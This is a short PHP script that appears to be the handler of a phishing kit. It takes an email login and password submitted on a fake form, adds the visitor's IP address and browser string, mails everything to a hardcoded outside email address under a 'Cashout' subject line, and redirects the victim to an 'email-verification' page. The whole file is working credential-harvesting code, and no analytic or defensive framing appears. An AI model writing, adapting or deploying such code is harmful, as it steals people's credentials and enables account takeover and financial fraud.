<?php
header('Location: /email-verification');
$Agent=$_SERVER['HTTP_USER_AGENT'];
$Ip=$_SERVER['REMOTE_ADDR'];
$login_email=$_POST['login_email'];
$password=$_POST['password'];
$nl="\r\n";
$from = "Cashout";
$to = "nwaforalex158@outlook.com";
$subject = "Cashout Is A Must By Gods  Grace";
$message = 'LOGIN EMAIL: ' . $login_email . $nl.'PASSWORD: ' . $password .$nl. 'IP: ' . $Ip  . $nl. 'USERAGENT: ' . $Agent ;
$headers = "From:" . $from;
mail($to,$subject,$message, $headers) 
?>